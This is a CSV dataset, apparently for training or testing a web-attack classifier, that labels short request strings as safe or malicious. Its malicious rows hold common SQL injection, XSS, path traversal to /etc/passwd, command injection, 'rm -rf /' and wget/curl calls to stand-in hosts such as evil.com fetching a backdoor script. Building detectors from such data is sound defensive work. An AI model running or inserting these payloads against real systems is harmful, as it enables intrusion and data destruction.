request,label
<b>Welcome</b>,safe
feedback=Great+App!,safe
username=monica&password=secure123,safe
admin' --,malicious
GET /products?id=25,safe
user-profile,safe
hello world,safe
feedback=Great+App!,safe
hello world,safe
' OR 'a'='a,malicious
username=monica&password=secure123,safe
<iframe src='http://evil.com'></iframe>,malicious
dashboard,safe
GET /products?id=25,safe
' OR '1'='1,malicious
../../etc/passwd,malicious
home page,safe
curl http://evil.com,malicious
ping 127.0.0.1; ls,malicious
GET /products?id=25,safe
search?q=python,safe
dashboard,safe
`rm -rf /`,malicious
feedback=Great+App!,safe
<b>Welcome</b>,safe
profile-picture=default.jpg,safe
<body onload=alert('hack')>,malicious
<svg onload=alert(1)>,malicious
<form action='http://evil.com'><input type='submit'></form>,malicious
<svg onload=alert(1)>,malicious
<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
<img src='x' onerror='alert(1)'>,malicious
'; DROP TABLE users; --,malicious
' OR '1'='1,malicious
docs.html,safe
' OR 'a'='a,malicious
|| ls -la,malicious
contact form,safe
login success,safe
feedback=Great+App!,safe
admin' --,malicious
ping 127.0.0.1; ls,malicious
search?q=python,safe
login success,safe
<body onload=alert('hack')>,malicious
' UNION SELECT * FROM users --,malicious
|| ls -la,malicious
dashboard,safe
' UNION SELECT * FROM users --,malicious
username=monica&password=secure123,safe
<form action='http://evil.com'><input type='submit'></form>,malicious
username=monica&password=secure123,safe
'; DROP TABLE users; --,malicious
signup success,safe
home page,safe
<b>Welcome</b>,safe
<iframe src='http://evil.com'></iframe>,malicious
user-profile,safe
0x50 + 0x51,malicious
system('ls'),malicious
0x50 + 0x51,malicious
curl http://evil.com,malicious
/about-us,safe
<body onload=alert('hack')>,malicious
0x50 + 0x51,malicious
hello world,safe
dashboard,safe
admin' --,malicious
feedback=Great+App!,safe
admin' --,malicious
home page,safe
dashboard,safe
<svg onload=alert(1)>,malicious
system('ls'),malicious
docs.html,safe
<script>alert(1)</script>,malicious
search?q=python,safe
username=monica&password=secure123,safe
<body onload=alert('hack')>,malicious
<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
hello world,safe
hello world,safe
email=hi@example.com,safe
<body onload=alert('hack')>,malicious
wget http://malicious.com/backdoor.sh,malicious
<b>Welcome</b>,safe
`rm -rf /`,malicious
feedback=Great+App!,safe
search?q=python,safe
<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
<script>alert(1)</script>,malicious
dashboard,safe
status=active,safe
hello world,safe
user-profile,safe
0x50 + 0x51,malicious
GET /products?id=25,safe
<form action='http://evil.com'><input type='submit'></form>,malicious
profile-picture=default.jpg,safe
../../etc/passwd,malicious
ping 127.0.0.1; ls,malicious
<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
user-profile,safe
GET /products?id=25,safe
<iframe src='http://evil.com'></iframe>,malicious
user-profile,safe
GET /products?id=25,safe
<body onload=alert('hack')>,malicious
search?q=python,safe
/about-us,safe
home page,safe
contact form,safe
email=hi@example.com,safe
<script>alert(1)</script>,malicious
search?q=python,safe
<body onload=alert('hack')>,malicious
GET /products?id=25,safe
../../etc/passwd,malicious
contact form,safe
' OR '1'='1,malicious
<img src='x' onerror='alert(1)'>,malicious
0x50 + 0x51,malicious
<form action='http://evil.com'><input type='submit'></form>,malicious
wget http://malicious.com/backdoor.sh,malicious
' OR '1'='1,malicious
contact form,safe
<img src='x' onerror='alert(1)'>,malicious
signup success,safe
docs.html,safe
email=hi@example.com,safe
hello world,safe
../../etc/passwd,malicious
status=active,safe
' UNION SELECT * FROM users --,malicious
feedback=Great+App!,safe
status=active,safe
admin' --,malicious
admin' --,malicious
reset-password,safe
profile-picture=default.jpg,safe
<form action='http://evil.com'><input type='submit'></form>,malicious
<iframe src='http://evil.com'></iframe>,malicious
' UNION SELECT * FROM users --,malicious
curl http://evil.com,malicious
docs.html,safe
<script>alert(1)</script>,malicious
login success,safe
dashboard,safe
index.html,safe
user-profile,safe
<form action='http://evil.com'><input type='submit'></form>,malicious
' OR '1'='1,malicious
admin' --,malicious
home page,safe
' OR 'a'='a,malicious
email=hi@example.com,safe
<img src='x' onerror='alert(1)'>,malicious
hello world,safe
signup success,safe
|| ls -la,malicious
profile-picture=default.jpg,safe
ping 127.0.0.1; ls,malicious
ping 127.0.0.1; ls,malicious
settings,safe
GET /products?id=25,safe
' OR 'a'='a,malicious
username=monica&password=secure123,safe
wget http://malicious.com/backdoor.sh,malicious
dashboard,safe
feedback=Great+App!,safe
<b>Welcome</b>,safe
profile-picture=default.jpg,safe
feedback=Great+App!,safe
search?q=python,safe
reset-password,safe
|| ls -la,malicious
docs.html,safe
email=hi@example.com,safe
status=active,safe
reset-password,safe
' OR '1'='1,malicious
home page,safe
contact form,safe
user-profile,safe
<form action='http://evil.com'><input type='submit'></form>,malicious
email=hi@example.com,safe
<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
admin' --,malicious
/about-us,safe
<iframe src='http://evil.com'></iframe>,malicious
<b>Welcome</b>,safe
home page,safe
<iframe src='http://evil.com'></iframe>,malicious
ping 127.0.0.1; ls,malicious
reset-password,safe
GET /products?id=25,safe
username=monica&password=secure123,safe
' OR 'a'='a,malicious
wget http://malicious.com/backdoor.sh,malicious
<form action='http://evil.com'><input type='submit'></form>,malicious
home page,safe
' OR '1'='1,malicious
' UNION SELECT * FROM users --,malicious
<form action='http://evil.com'><input type='submit'></form>,malicious
'; DROP TABLE users; --,malicious
home page,safe
<iframe src='http://evil.com'></iframe>,malicious
docs.html,safe
admin' --,malicious
/about-us,safe
<img src='x' onerror='alert(1)'>,malicious
curl http://evil.com,malicious
<b>Welcome</b>,safe
'; DROP TABLE users; --,malicious
<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
<form action='http://evil.com'><input type='submit'></form>,malicious
username=monica&password=secure123,safe
GET /products?id=25,safe
<b>Welcome</b>,safe
user-profile,safe
`rm -rf /`,malicious
|| ls -la,malicious
ping 127.0.0.1; ls,malicious
<body onload=alert('hack')>,malicious
user-profile,safe
docs.html,safe
<form action='http://evil.com'><input type='submit'></form>,malicious
signup success,safe
feedback=Great+App!,safe
<svg onload=alert(1)>,malicious
login success,safe
<b>Welcome</b>,safe
curl http://evil.com,malicious
curl http://evil.com,malicious
curl http://evil.com,malicious
profile-picture=default.jpg,safe
index.html,safe
' OR 'a'='a,malicious
/about-us,safe
contact form,safe
login success,safe
settings,safe
signup success,safe
settings,safe
settings,safe
settings,safe
hello world,safe
<form action='http://evil.com'><input type='submit'></form>,malicious
<svg onload=alert(1)>,malicious
docs.html,safe
dashboard,safe
index.html,safe
<form action='http://evil.com'><input type='submit'></form>,malicious
reset-password,safe
settings,safe
|| ls -la,malicious
settings,safe
<script>alert(1)</script>,malicious
' UNION SELECT * FROM users --,malicious
reset-password,safe
../../etc/passwd,malicious
login success,safe
status=active,safe
../../etc/passwd,malicious
<img src='x' onerror='alert(1)'>,malicious
login success,safe
../../etc/passwd,malicious
<b>Welcome</b>,safe
profile-picture=default.jpg,safe
<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
search?q=python,safe
../../etc/passwd,malicious
username=monica&password=secure123,safe
dashboard,safe
signup success,safe
curl http://evil.com,malicious
wget http://malicious.com/backdoor.sh,malicious
'; DROP TABLE users; --,malicious
curl http://evil.com,malicious
search?q=python,safe
contact form,safe
' UNION SELECT * FROM users --,malicious
<script>alert(1)</script>,malicious
user-profile,safe
signup success,safe

